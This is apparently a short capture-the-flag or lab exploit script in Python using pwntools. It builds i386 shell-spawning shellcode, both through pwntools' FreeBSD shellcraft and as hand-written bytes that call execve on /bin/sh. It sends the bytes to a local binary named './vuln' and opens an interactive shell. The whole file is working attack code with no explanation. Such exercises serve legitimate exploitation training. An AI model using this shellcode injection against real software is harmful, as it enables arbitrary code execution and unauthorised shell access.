#! /usr/bin/python

from pwn import *

shellcode = pwnlib.shellcraft.i386.freebsd.sh()

imp_shellcode ="\x31\xc0\x50\x68"
imp_shellcode +="\x2f\x2f\x73\x68"
imp_shellcode +="\x68\x2f\x62\x69"
imp_shellcode +="\x6e\x89\xe3\x50"
imp_shellcode +="\x53\x89\xe1\x31"
imp_shellcode +="\xc0\x40\x40\x40"
imp_shellcode +="\x40\x40\x40\x40"
imp_shellcode +="\x40\x40\x40\x40"
imp_shellcode +="\xcd\x80"

print shellcode

p = process("./vuln")

print p.recv()
p.sendline(imp_shellcode)
p.interactive()
